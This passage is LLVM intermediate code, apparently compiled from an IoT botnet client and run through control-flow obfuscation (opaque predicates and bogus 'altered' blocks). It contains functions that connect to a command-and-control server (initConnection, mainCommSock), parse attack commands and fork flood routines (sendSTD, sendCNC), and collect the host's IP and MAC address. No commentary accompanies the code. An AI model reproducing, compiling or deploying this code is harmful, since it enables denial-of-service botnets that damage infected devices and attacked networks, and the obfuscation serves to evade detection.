  %1877 = call i32 @strcmp(i8* %1876, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.529, i32 0, i32 0)) #10
  %1878 = icmp ne i32 %1877, 0
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %743
  %1879 = load i8**, i8*** %4, align 8
  %1880 = getelementptr inbounds i8*, i8** %1879, i64 5
  %1881 = load i8*, i8** %1880, align 8
  %1882 = call i32 @atoi(i8* %1881) #10
  %1883 = icmp eq i32 %1882, -1
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %771
  %1884 = load i8**, i8*** %4, align 8
  %1885 = getelementptr inbounds i8*, i8** %1884, i64 5
  %1886 = load i8*, i8** %1885, align 8
  %1887 = call i32 @atoi(i8* %1886) #10
  %1888 = icmp sgt i32 %1887, 65500
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %793
  %1889 = load i8**, i8*** %4, align 8
  %1890 = getelementptr inbounds i8*, i8** %1889, i64 4
  %1891 = load i8*, i8** %1890, align 8
  %1892 = call i32 @atoi(i8* %1891) #10
  %1893 = icmp sgt i32 %1892, 32
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %857
  %1894 = load i8**, i8*** %4, align 8
  %1895 = getelementptr inbounds i8*, i8** %1894, i64 7
  %1896 = load i8*, i8** %1895, align 8
  %1897 = call i32 @atoi(i8* %1896) #10
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %888
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %916
  %1898 = call i32 @listFork()
  %1899 = icmp ne i32 %1898, 0
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %947
  %1900 = call i32 @listFork()
  %1901 = icmp ne i32 %1900, 0
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %986
  %1902 = load i8**, i8*** %4, align 8
  %1903 = getelementptr inbounds i8*, i8** %1902, i64 3
  %1904 = load i8*, i8** %1903, align 8
  %1905 = call i32 @atoi(i8* %1904) #10
  %1906 = icmp eq i32 %1905, -1
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %1014
  %1907 = load i8**, i8*** %4, align 8
  %1908 = getelementptr inbounds i8*, i8** %1907, i64 4
  %1909 = load i8*, i8** %1908, align 8
  %1910 = call i32 @atoi(i8* %1909) #10
  %1911 = icmp eq i32 %1910, -1
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %1045
  %1912 = load i8**, i8*** %4, align 8
  %1913 = getelementptr inbounds i8*, i8** %1912, i64 6
  %1914 = load i8*, i8** %1913, align 8
  %1915 = call i32 @atoi(i8* %1914) #10
  %1916 = icmp slt i32 %1915, 0
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %1098
  %1917 = load i8**, i8*** %4, align 8
  %1918 = getelementptr inbounds i8*, i8** %1917, i64 7
  %1919 = load i8*, i8** %1918, align 8
  %1920 = call i32 @atoi(i8* %1919) #10
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %1120
  store i32 %1121, i32* %43, align 4
  %1921 = load i32, i32* %3, align 4
  %1922 = icmp sgt i32 %1921, 6
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1145
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1162
  store i32 %1163, i32* %44, align 4
  %1923 = load i8*, i8** %38, align 8
  %1924 = call i8* @strstr(i8* %1923, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #10
  %1925 = icmp ne i8* %1924, null
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1186
  %1926 = load i8*, i8** %45, align 8
  %1927 = icmp ne i8* %1926, null
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1218
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1235
  %1928 = call i32 @listFork()
  %1929 = icmp ne i32 %1928, 0
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1262
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1280
  %1930 = load i8**, i8*** %4, align 8
  %1931 = getelementptr inbounds i8*, i8** %1930, i64 0
  %1932 = load i8*, i8** %1931, align 8
  %1933 = call i32 @strcmp(i8* %1932, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.531, i32 0, i32 0)) #10
  %1934 = icmp ne i32 %1933, 0
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1305
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1362
  %1935 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %1935, i8** %46, align 8
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1415
  %1936 = load i32, i32* %3, align 4
  %1937 = icmp slt i32 %1936, 4
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1434
  %1938 = load i8**, i8*** %4, align 8
  %1939 = getelementptr inbounds i8*, i8** %1938, i64 2
  %1940 = load i8*, i8** %1939, align 8
  %1941 = call i32 @atoi(i8* %1940) #10
  %1942 = icmp slt i32 %1941, 1
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1484
  %1943 = call i32 @listFork()
  %1944 = icmp ne i32 %1943, 0
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1503
  %1945 = load i8*, i8** %50, align 8
  %1946 = load i32, i32* %48, align 4
  %1947 = load i32, i32* %49, align 4
  call void @sendCNC(i8* %1945, i32 %1946, i32 %1947)
  %1948 = load i32, i32* @mainCommSock, align 4
  %1949 = call i32 @close(i32 %1948)
  call void @_exit(i32 0) #12
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1528
  %1950 = call i32 @listFork()
  %1951 = icmp ne i32 %1950, 0
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1548
  %1952 = load i8*, i8** %47, align 8
  %1953 = load i32, i32* %48, align 4
  %1954 = load i32, i32* %49, align 4
  call void @sendCNC(i8* %1952, i32 %1953, i32 %1954)
  call void @_exit(i32 0) #12
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %1578
  %1955 = load i8**, i8*** %4, align 8
  %1956 = getelementptr inbounds i8*, i8** %1955, i64 2
  %1957 = load i8*, i8** %1956, align 8
  %1958 = call i32 @atoi(i8* %1957) #10
  %1959 = icmp slt i32 %1958, 1
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %1607
  %1960 = load i8**, i8*** %4, align 8
  %1961 = getelementptr inbounds i8*, i8** %1960, i64 1
  %1962 = load i8*, i8** %1961, align 8
  store i8* %1962, i8** %51, align 8
  %1963 = load i8**, i8*** %4, align 8
  %1964 = getelementptr inbounds i8*, i8** %1963, i64 2
  %1965 = load i8*, i8** %1964, align 8
  %1966 = call i32 @atoi(i8* %1965) #10
  store i32 %1966, i32* %52, align 4
  %1967 = load i8**, i8*** %4, align 8
  %1968 = getelementptr inbounds i8*, i8** %1967, i64 3
  %1969 = load i8*, i8** %1968, align 8
  %1970 = call i32 @atoi(i8* %1969) #10
  store i32 %1970, i32* %53, align 4
  %1971 = load i8*, i8** %51, align 8
  %1972 = call i8* @strstr(i8* %1971, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #10
  %1973 = icmp ne i8* %1972, null
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1654
  %1974 = call i32 @listFork()
  %1975 = icmp ne i32 %1974, 0
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1674
  %1976 = load i8*, i8** %51, align 8
  %1977 = load i32, i32* %52, align 4
  %1978 = load i32, i32* %53, align 4
  call void @sendSTD(i8* %1976, i32 %1977, i32 %1978)
  call void @_exit(i32 0) #12
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %1695
  %1979 = load i8**, i8*** %4, align 8
  %1980 = getelementptr inbounds i8*, i8** %1979, i64 0
  %1981 = load i8*, i8** %1980, align 8
  %1982 = call i32 @strcmp(i8* %1981, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.534, i32 0, i32 0)) #10
  %1983 = icmp ne i32 %1982, 0
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %1718
  %1984 = load i64, i64* %56, align 8
  %1985 = load i64, i64* @numpids, align 8
  %1986 = icmp ult i64 %1984, %1985
  br label %originalBB210

originalBB214alteredBB:                           ; preds = %originalBB214, %1759
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %1786
  %1987 = load i32, i32* @mainCommSock, align 4
  %1988 = call i32 (i32, i8*, ...) @sockprintf(i32 %1987, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.536, i32 0, i32 0))
  br label %originalBB218

originalBB222alteredBB:                           ; preds = %originalBB222, %1812
  call void @exit(i32 0) #14
  br label %originalBB222
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %26

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @x.105
  %9 = load i32, i32* @y.106
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* @mainCommSock, align 4
  %17 = call i32 @close(i32 %16)
  store i32 0, i32* @mainCommSock, align 4
  %18 = load i32, i32* @x.105
  %19 = load i32, i32* @y.106
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %0
  %27 = load i32, i32* @x.105
  %28 = load i32, i32* @y.106
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  %35 = load i32, i32* @currentServer, align 4
  %36 = add nsw i32 %35, 1
  %37 = sext i32 %36 to i64
  %38 = icmp eq i64 %37, 1
  %39 = load i32, i32* @x.105
  %40 = load i32, i32* @y.106
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart212, label %originalBB1alteredBB

originalBBpart212:                                ; preds = %originalBB1
  br i1 %38, label %47, label %64

; <label>:47:                                     ; preds = %originalBBpart212
  %48 = load i32, i32* @x.105
  %49 = load i32, i32* @y.106
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %47
  store i32 0, i32* @currentServer, align 4
  %56 = load i32, i32* @x.105
  %57 = load i32, i32* @y.106
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %83

; <label>:64:                                     ; preds = %originalBBpart212
  %65 = load i32, i32* @x.105
  %66 = load i32, i32* @y.106
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %64
  %73 = load i32, i32* @currentServer, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* @currentServer, align 4
  %75 = load i32, i32* @x.105
  %76 = load i32, i32* @y.106
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart228, label %originalBB18alteredBB

originalBBpart228:                                ; preds = %originalBB18
  br label %83

; <label>:83:                                     ; preds = %originalBBpart228, %originalBBpart216
  %84 = load i32, i32* @x.105
  %85 = load i32, i32* @y.106
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %83
  %92 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %93 = load i32, i32* @currentServer, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds [1 x i8*], [1 x i8*]* @PromServer, i64 0, i64 %94
  %96 = load i8*, i8** %95, align 8
  %97 = call i8* @strcpy(i8* %92, i8* %96) #2
  store i32 27, i32* %3, align 4
  %98 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %99 = call i8* @strchr(i8* %98, i32 58) #10
  %100 = icmp ne i8* %99, null
  %101 = load i32, i32* @x.105
  %102 = load i32, i32* @y.106
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %100, label %109, label %116

; <label>:109:                                    ; preds = %originalBBpart232
  %110 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %111 = call i8* @strchr(i8* %110, i32 58) #10
  %112 = getelementptr inbounds i8, i8* %111, i64 1
  %113 = call i32 @atoi(i8* %112) #10
  store i32 %113, i32* %3, align 4
  %114 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %115 = call i8* @strchr(i8* %114, i32 58) #10
  store i8 0, i8* %115, align 1
  br label %116

; <label>:116:                                    ; preds = %109, %originalBBpart232
  %117 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %117, i32* @mainCommSock, align 4
  %118 = load i32, i32* @mainCommSock, align 4
  %119 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %120 = load i32, i32* %3, align 4
  %121 = call i32 @connectTimeout(i32 %118, i8* %119, i32 %120, i32 30)
  %122 = icmp ne i32 %121, 0
  br i1 %122, label %140, label %123

; <label>:123:                                    ; preds = %116
  %124 = load i32, i32* @x.105
  %125 = load i32, i32* @y.106
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %123
  store i32 1, i32* %1, align 4
  %132 = load i32, i32* @x.105
  %133 = load i32, i32* @y.106
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %141

; <label>:140:                                    ; preds = %116
  store i32 0, i32* %1, align 4
  br label %141

; <label>:141:                                    ; preds = %140, %originalBBpart236
  %142 = load i32, i32* %1, align 4
  ret i32 %142

originalBBalteredBB:                              ; preds = %originalBB, %7
  %143 = load i32, i32* @mainCommSock, align 4
  %144 = call i32 @close(i32 %143)
  store i32 0, i32* @mainCommSock, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
  %145 = load i32, i32* @currentServer, align 4
  %_ = shl i32 %145, 1
  %_2 = sub i32 0, %145
  %gen = add i32 %_2, 1
  %_3 = sub i32 0, %145
  %gen4 = add i32 %_3, 1
  %_5 = sub i32 %145, 1
  %gen6 = mul i32 %_5, 1
  %_7 = sub i32 0, %145
  %gen8 = add i32 %_7, 1
  %_9 = sub i32 0, %145
  %gen10 = add i32 %_9, 1
  %146 = add nsw i32 %145, 1
  %147 = sext i32 %146 to i64
  %148 = icmp eq i64 %147, 1
  br label %originalBB1

originalBB14alteredBB:                            ; preds = %originalBB14, %47
  store i32 0, i32* @currentServer, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %64
  %149 = load i32, i32* @currentServer, align 4
  %_19 = sub i32 %149, 1
  %gen20 = mul i32 %_19, 1
  %_21 = sub i32 0, %149
  %gen22 = add i32 %_21, 1
  %_23 = sub i32 0, %149
  %gen24 = add i32 %_23, 1
  %_25 = sub i32 0, %149
  %gen26 = add i32 %_25, 1
  %150 = add nsw i32 %149, 1
  store i32 %150, i32* @currentServer, align 4
  br label %originalBB18

originalBB30alteredBB:                            ; preds = %originalBB30, %83
  %151 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %152 = load i32, i32* @currentServer, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds [1 x i8*], [1 x i8*]* @PromServer, i64 0, i64 %153
  %155 = load i8*, i8** %154, align 8
  %156 = call i8* @strcpy(i8* %151, i8* %155) #2
  store i32 27, i32* %3, align 4
  %157 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %158 = call i8* @strchr(i8* %157, i32 58) #10
  %159 = icmp ne i8* %158, null
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %123
  store i32 1, i32* %1, align 4
  br label %originalBB34
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %181

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.538, i32 0, i32 0)) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %181

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #2
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %53

; <label>:36:                                     ; preds = %30
  %37 = load i32, i32* @x.107
  %38 = load i32, i32* @y.108
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  store i32 0, i32* %1, align 4
  %45 = load i32, i32* @x.107
  %46 = load i32, i32* @y.108
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %181

; <label>:53:                                     ; preds = %30
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 4
  store i32 %56, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %57 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.539, i32 0, i32 0), i32 0)
  store i32 %57, i32* %7, align 4
  br label %58

; <label>:58:                                     ; preds = %95, %53
  %59 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %60 = load i32, i32* %7, align 4
  %61 = call i8* @fdgets(i8* %59, i32 4096, i32 %60)
  %62 = icmp ne i8* %61, null
  br i1 %62, label %63, label %97

; <label>:63:                                     ; preds = %58
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %65 = call i8* @strstr(i8* %64, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.540, i32 0, i32 0)) #10
  %66 = icmp ne i8* %65, null
  br i1 %66, label %67, label %95

; <label>:67:                                     ; preds = %63
  %68 = load i32, i32* @x.107
  %69 = load i32, i32* @y.108
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %67
  %76 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %76, i8** %9, align 8
  %77 = load i32, i32* @x.107
  %78 = load i32, i32* @y.108
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %85

; <label>:85:                                     ; preds = %90, %originalBBpart24
  %86 = load i8*, i8** %9, align 8
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp ne i32 %88, 9
  br i1 %89, label %90, label %93

; <label>:90:                                     ; preds = %85
  %91 = load i8*, i8** %9, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 1
  store i8* %92, i8** %9, align 8
  br label %85

; <label>:93:                                     ; preds = %85
  %94 = load i8*, i8** %9, align 8
  store i8 0, i8* %94, align 1
  br label %97

; <label>:95:                                     ; preds = %63
  %96 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %96, i8 0, i64 4096, i32 16, i1 false)
  br label %58

; <label>:97:                                     ; preds = %93, %58
  %98 = load i32, i32* @x.107
  %99 = load i32, i32* @y.108
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %97
  %106 = load i32, i32* %7, align 4
  %107 = call i32 @close(i32 %106)
  %108 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %109 = load i8, i8* %108, align 16
  %110 = icmp ne i8 %109, 0
  %111 = load i32, i32* @x.107
  %112 = load i32, i32* @y.108
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %110, label %119, label %178

; <label>:119:                                    ; preds = %originalBBpart28
  %120 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %121 = bitcast %union.anon.5* %120 to [16 x i8]*
  %122 = getelementptr inbounds [16 x i8], [16 x i8]* %121, i32 0, i32 0
  %123 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %124 = call i8* @strcpy(i8* %122, i8* %123) #2
  %125 = load i32, i32* %2, align 4
  %126 = call i32 (i32, i64, ...) @ioctl(i32 %125, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %127

; <label>:127:                                    ; preds = %originalBBpart221, %119
  %128 = load i32, i32* @x.107
  %129 = load i32, i32* @y.108
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %127
  %136 = load i32, i32* %10, align 4
  %137 = icmp slt i32 %136, 6
  %138 = load i32, i32* @x.107
  %139 = load i32, i32* @y.108
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %137, label %146, label %177

; <label>:146:                                    ; preds = %originalBBpart212
  %147 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %148 = bitcast %union.anon.6* %147 to %struct.sockaddr*
  %149 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %148, i32 0, i32 1
  %150 = getelementptr inbounds [14 x i8], [14 x i8]* %149, i32 0, i32 0
  %151 = load i32, i32* %10, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds i8, i8* %150, i64 %152
  %154 = load i8, i8* %153, align 1
  %155 = load i32, i32* %10, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %156
  store i8 %154, i8* %157, align 1
  br label %158

; <label>:158:                                    ; preds = %146
  %159 = load i32, i32* @x.107
  %160 = load i32, i32* @y.108
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %158
  %167 = load i32, i32* %10, align 4
  %168 = add nsw i32 %167, 1
  store i32 %168, i32* %10, align 4
  %169 = load i32, i32* @x.107
  %170 = load i32, i32* @y.108
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBBpart221, label %originalBB14alteredBB

originalBBpart221:                                ; preds = %originalBB14
  br label %127

; <label>:177:                                    ; preds = %originalBBpart212
  br label %178

; <label>:178:                                    ; preds = %177, %originalBBpart28
  %179 = load i32, i32* %2, align 4
  %180 = call i32 @close(i32 %179)
  br label %181

